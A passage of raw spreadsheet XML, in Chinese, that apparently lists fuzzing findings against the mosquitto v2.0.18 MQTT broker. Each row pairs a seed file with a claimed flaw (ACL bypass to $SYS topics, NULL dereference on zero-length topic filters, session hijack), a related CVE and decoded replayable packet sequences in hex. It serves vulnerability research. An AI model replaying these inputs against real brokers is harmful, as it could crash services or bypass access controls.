          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B513" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C513" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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513" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0142 ===\u000a大小: 1109B (报告+请求数据)\u000a请求数据: 223B\u000a\u000a---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MQTT请求序列(223B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2199 Topics=[''(零长度!QoS=2)] | raw_header=822d08970000122473686172652f6772\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=141B | raw_header=32ac01001d245359532f62726f6b6572\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=e5</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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1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14">
      <c r="A514" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B514" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C514" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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14" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0143 ===\u000a大小: 975B (报告+请求数据)\u000a请求数据: 104B\u000a\u000a---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MQTT请求序列(104B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=40 Topics=[''(零长度!QoS=1)] | raw_header=822d0028000009612f622f632f642f65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload='\x1d\x01Í\x02:\x19 Ì\x08\x00\x01#\x0bÿ\x8e\x98R\x03\x00\u000atest/topicf\x94¸' | raw_header=30360013245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=04</f>
        <v/>
      </c>
      <c r="F5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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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15">
      <c r="A515" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:01c0</t>
        </is>
      </c>
      <c r="B515" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C515" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(166B)\u000a4.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515" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c0 ===\u000a大小: 1093B (报告+请求数据)\u000a请求数据: 166B\u000a\u000a---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MQTT请求序列(166B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2182 Topics=[''(零长度!QoS=3)] | raw_header=8248088600000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload_len=62B | raw_header=3d5500152473686172652f6772702f74\u000aMsg[3]: (不完整,5B) raw=004de4fd5e\u000a(尾部5B): 004de4fd5e</f>
        <v/>
      </c>
      <c r="F5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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J51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16">
      <c r="A516" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:01c1</t>
        </is>
      </c>
      <c r="B516" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C516" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(512B)\u000a4.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16" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c1 ===\u000a大小: 5521B (报告+请求数据)\u000a请求数据: 512B\u000a\u000a---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MQTT请求序列(512B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=32512s [持久会话] | raw_header=105500044d51545404c07f000000655f\u000aMsg[2]: CONNACK session_present=0 reason_code=0 | raw_header=205700007f3d77696c04e30404040404\u000aMsg[3]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d7465732d7369696969696969696969\u000aMsg[4]: PUBREL PacketID=26985 | raw_header=69696969696969696969696969696969\u000aMsg[5]: TYPE0  | raw_header=040404040404\u000aMsg[6]: TYPE0  | raw_header=04046c750000\u000aMsg[7]: SUBSCRIBE  | raw_header=8000\u000aMsg[8]: SUBSCRIBE PacketID=624 Topics=[] | raw_header=821f02707008001d6573742f23204b00\u000aMsg[9]: TYPE0  | raw_header=000404040404\u000aMsg[10]: TYPE0  | raw_header=040404041000\u000aMsg[11]: TYPE0  | raw_header=040404040404\u000aMsg[12]: TYPE0  | raw_header=040404046c75\u000aMsg[13]: TYPE0  | raw_header=0000\u000aMsg[14]: SUBSCRIBE  | raw_header=8000\u000aMsg[15]: SUBSCRIBE PacketID=633 Topics=[''(零长度!QoS=2)] | raw_header=821f027900000a745573742f746f7069\u000aMsg[16]: (不完整,3B) raw=2d736c\u000a(尾部3B): 2d736c</f>
        <v/>
      </c>
      <c r="F5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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J51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17">
      <c r="A517" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B517" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C517" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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517" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c2 ===\u000a大小: 1193B (报告+请求数据)\u000a请求数据: 120B\u000a\u000a---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SUBSCRIBE PacketID=914 Topics=[''(零长度!QoS=3)] | raw_header=8211039200000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload_len=67B | raw_header=3d62001d245359532f62726f6b65722f\u000aMsg[3]: PUBREC  | raw_header=53</f>
        <v/>
      </c>
      <c r="F5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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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1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18">
      <c r="A518" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:01c3</t>
        </is>
      </c>
      <c r="B518" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C518" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(142B)\u000a4.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18" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c3 ===\u000a大小: 1200B (报告+请求数据)\u000a请求数据: 142B\u000a\u000a---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MQTT请求序列(142B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=316 Topics=[''(零长度!QoS=0)] | raw_header=8232013c0000142473686172652f6772\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=65B | raw_header=3d560013245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=3f3f\u000a(尾部2B): 3f3f</f>
        <v/>
      </c>
      <c r="F5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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J51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1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19">
      <c r="A519" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B519" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C519" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(350B)\u000a4.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19" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 4986B (报告+请求数据)\u000a请求数据: 350B\u000a\u000a---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MQTT请求序列(350B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[''(零长度!QoS=0), ''(零长度!QoS=2)] | raw_header=820b000400000400000a000200\u000aMsg[2]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1d746573742d636c69656e742d776974\u000aMsg[3]: SUBSCRIBE PacketID=28773 Topics=[] | raw_header=856d7065142473686172652f67727032\u000aMsg[4]: PUBREL PacketID=25186 | raw_header=62626262626262626262626262626262\u000aMsg[5]: (不完整,8B) raw=893876ed3ff40524\u000a(尾部8B): 893876ed3ff40524</f>
        <v/>
      </c>
      <c r="F5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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J51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1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20">
      <c r="A520" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B520" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C520" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(157B)\u000a4.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520" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0246 ===\u000a大小: 922B (报告+请求数据)\u000a请求数据: 157B\u000a\u000a---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MQTT请求序列(157B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=681 Topics=[''(零长度!QoS=1)] | raw_header=823c02a900001d245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='home/+/temperature' QoS=2 retain=False payload_len=71B | raw_header=3c5b0012686f6d652f2b2f74656d7065\u000aMsg[3]: (不完整,2B) raw=1004\u000a(尾部2B): 1004</f>
        <v/>
      </c>
      <c r="F5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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J52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2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21">
      <c r="A521" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B521" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C521" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(298B)\u000a4.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521" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 1223B (报告+请求数据)\u000a请求数据: 298B\u000a\u000a---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MQTT请求序列(298B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1406 Topics=[''(零长度!QoS=0)] | raw_header=8247057e0000142473686172652f6772\u000aMsg[2]: PUBLISH Topic='home/+/temperature' QoS=1 retain=True payload_len=144B | raw_header=33a4010012686f6d652f2b2f74656d70\u000aMsg[3]: PUBREC PacketID=2056 | raw_header=52080808080808080808\u000aMsg[4]: TYPE0  | raw_header=08080808080808080865\u000aMsg[5]: (不完整,38B) raw=18335e000dffd1121212121212121212686172652f677270312f23027a448000637465640900\u000a(尾部38B): 18335e000dffd1121212121212121212686172652f677270312f23027a448000637465640900</f>
        <v/>
      </c>
      <c r="F5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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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2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22">
      <c r="A522" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B522" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C522" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1069B)\u000a4.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522" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 1961B (报告+请求数据)\u000a请求数据: 1069B\u000a\u000a---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MQTT请求序列(1069B原始二进制) ---\u000aMsg[1]: CONNACK session_present=4 reason_code=0 | raw_header=2c2c0400ffff050013612f622ffa002f\u000aMsg[2]: CONNACK session_present=47 reason_code=104 | raw_header=2f672f682f692f6a00820a05ffff052b\u000aMsg[3]: CONNACK session_present=35 reason_code=35 | raw_header=23232323232323232323232323232323\u000aMsg[4]: TYPE0  | raw_header=0a00\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=13612f622f632f642f652f662f672f68\u000aMsg[6]: SUBSCRIBE PacketID=277 Topics=[''(零长度!QoS=2)] | raw_header=82360115000012686f6d652f2b2f7465\u000aMsg[7]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=144B | raw_header=33a5010013245359532f62726f6b6572\u000aMsg[8]: UNSUBSCRIBE  | raw_header=a2112f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[9]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f000000102f2f2f2f2f\u000aMsg[10]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[11]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[12]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[13]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f652f662f672f682f\u000aMsg[14]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[15]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[16]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[17]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[18]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[19]: (不完整,47B) raw=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f0066ff23fffffa00e7e7e7e7e7e7ffffff5f6a\u000a(尾部47B): 2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f0066ff23fffffa00e7e7e7e7e7e7ffffff5f6a00820a05ffff99</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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2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23">
      <c r="A523" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0344</t>
        </is>
      </c>
      <c r="B523" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C523" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(111B)\u000a4.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523" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0344 ===\u000a大小: 4899B (报告+请求数据)\u000a请求数据: 111B\u000a\u000a---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MQTT请求序列(111B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=239 Topics=[''(零长度!QoS=0), '$share/grp2/sensor/#'(QoS=1), '$share/g3/home/+/temperature'(QoS=2)] | raw_header=823b00ef00000000142473686172652f\u000aMsg[2]: PUBLISH Topic='test/topic' QoS=1 retain=False payload='\x00ð' | raw_header=320e000a746573742f746f70696300f0\u000aMsg[3]: PUBREL PacketID=8507 | raw_header=641c213b00f80100aeb5155ef3601098\u000aMsg[4]: (不完整,4B) raw=70f70280\u000a(尾部4B): 70f70280</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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2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24">
      <c r="A524" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0346</t>
        </is>
      </c>
      <c r="B524" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C524" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:4,cat:0346)中的REQUEST DATA提取出来(381B)\u000a4.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0x0346\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E524" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0346 ===\u000a大小: 1270B (报告+请求数据)\u000a请求数据: 381B\u000a\u000a---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MQTT请求序列(381B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=21309 | raw_header=516f533d320909090909090909090000\u000aMsg[2]: TYPE0  | raw_header=0909030910090909090909\u000aMsg[3]: TYPE0  | raw_header=0900\u000aMsg[4]: TYPE0  | raw_header=0003e80909\u000aMsg[5]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[6]: TYPE0  | raw_header=0909090909090309100909\u000aMsg[7]: TYPE0  | raw_header=0909090909000003e80900\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: SUBSCRIBE PacketID=10505 Topics=[] | raw_header=8009290909090909090909\u000aMsg[10]: TYPE0  | raw_header=090909090905ffff050909\u000aMsg[11]: SUBSCRIBE PacketID=97 Topics=[''(零长度!QoS=0)] | raw_header=8237006100001c2473686172652f6733\u000aMsg[12]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=54B | raw_header=3a55001d245359532f62726f6b65722f\u000aMsg[13]: (不完整,49B) raw=00ff09090909093b000d7065720100ffff05090900ff09090909093b000d70657201000169062f23\u000a(尾部49B): 00ff09090909093b000d7065720100ffff05090900ff09090909093b000d70657201000169062f230193360040c040f412</f>
        <v/>
      </c>
      <c r="F5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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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25">
      <c r="A525" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:03c4</t>
        </is>
      </c>
      <c r="B525" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C525" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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525" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c4 ===\u000a大小: 1175B (报告+请求数据)\u000a请求数据: 82B\u000a\u000a---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MQTT请求序列(82B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=80 | raw_header=50020050\u000aMsg[2]: TYPE0  | raw_header=0200\u000aMsg[3]: SUBSCRIBE PacketID=324 Topics=[''(零长度!QoS=0)] | raw_header=82050144000000\u000aMsg[4]: PUBLISH Topic='sensor/temp' QoS=1 retain=True payload_len=53B | raw_header=3342000b73656e736f722f74656d7001\u000aMsg[5]: TYPE0  | raw_header=0e</f>
        <v/>
      </c>
      <c r="F5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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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2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26">
      <c r="A526" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:03c6</t>
        </is>
      </c>
      <c r="B526" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C526" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:4,cat:03c6)中的REQUEST DATA提取出来(184B)\u000a4.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0x03c6\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E526" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c6 ===\u000a大小: 1252B (报告+请求数据)\u000a请求数据: 184B\u000a\u000a---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MQTT请求序列(184B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3529 Topics=[''(零长度!QoS=3)] | raw_header=82360dc900000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=104B | raw_header=357d0013245359532f62726f6b65722f\u000aMsg[3]: UNSUBSCRIBE  | raw_header=ad</f>
        <v/>
      </c>
      <c r="F5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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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27">
      <c r="A527" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000002,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B527" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C527" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000002,sev:3,cat:0206)中的REQUEST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527" s="2">
        <f>== 种子标识: id:000002,sev:3,cat:0206 ===\u000a大小: 629B (报告+请求数据)\u000a请求数据: 120B\u000a\u000a---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MQTT请求序列(120B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(4427B) clean_session=True keepalive=75s Will=YES [自动清理会话] | raw_header=107500044d5154540526004b3a114b74\u000aMsg[2]: SUBSCRIBE  | raw_header=80</f>
        <v/>
      </c>
      <c r="F5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7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27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27" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J527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52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28">
      <c r="A528" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000004,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B528" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C528" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000004,sev:3,cat:0305)中的REQUEST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528" s="2">
        <f>== 种子标识: id:000004,sev:3,cat:0305 ===\u000a大小: 768B (报告+请求数据)\u000a请求数据: 79B\u000a\u000a---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MQTT请求序列(79B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v162 ClientID=''(28B) clean_session=False keepalive=1886s [持久会话] | raw_header=101300044d515454a238075e00001c24\u000aMsg[2]: (不完整,58B) raw=2f67332f686f6d652f2b2f74656d706572617475726500152473686172652f6772702f746573742f\u000a(尾部58B): 2f67332f686f6d652f2b2f74656d706572617475726500152473686172652f6772702f746573742f746f7069630402003c00</f>
        <v/>
      </c>
      <c r="F5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2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28" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J52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2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29">
      <c r="A529" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000005,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B529" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C529" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(121B)\u000a4.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529" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:0244 ===\u000a大小: 825B (报告+请求数据)\u000a请求数据: 121B\u000a\u000a---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MQTT请求序列(121B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='persistent_01'(13B) clean_session=False keepalive=60s [持久会话] | raw_header=101900044d5154540400003c000d7065\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=820b00010000100000742f2301\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=321300f01e191c150005504c41494e16\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e61e8e801e7c1207971291476eb40974\u000aMsg[5]: PUBLISH Topic='test/qos2' QoS=2 retain=False payload='\x00\x03hello2' | raw_header=34130009746573742f716f7332000368\u000aMsg[6]: TYPE0  | raw_header=0200\u000aMsg[7]: (不完整,5B) raw=04c000e000\u000a(尾部5B): 04c000e000</f>
        <v/>
      </c>
      <c r="F5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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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2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30">
      <c r="A530" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000006,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B530" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C530" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(145B)\u000a4.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0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E530" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0206 ===\u000a大小: 1014B (报告+请求数据)\u000a请求数据: 145B\u000a\u000a---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MQTT请求序列(145B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='persistent_01'(13B) clean_session=False keepalive=60s [持久会话] | raw_header=101900044d5154540400003c000d7065\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=1)] | raw_header=820b00010006746573742f2301\u000aMsg[3]: PUBLISH Topic='test/qos1' QoS=1 retain=False payload='\x00\x02hello1' | raw_header=32130009746573742f716f7331000268\u000aMsg[4]: PUBLISH Topic='55\x00\x13$SYS/' QoS=2 retain=False payload='broker/v' | raw_header=3413000935350013245359532f62726f\u000aMsg[5]: (不完整,63B) raw=657273696f6e00d94d3d3bf03453b140b9421bda4523915e0562ec0a741dd09643786afa7eb17465\u000a(尾部63B): 657273696f6e00d94d3d3bf03453b140b9421bda4523915e0562ec0a741dd09643786afa7eb1746573742f716f7332000368</f>
        <v/>
      </c>
      <c r="F5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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
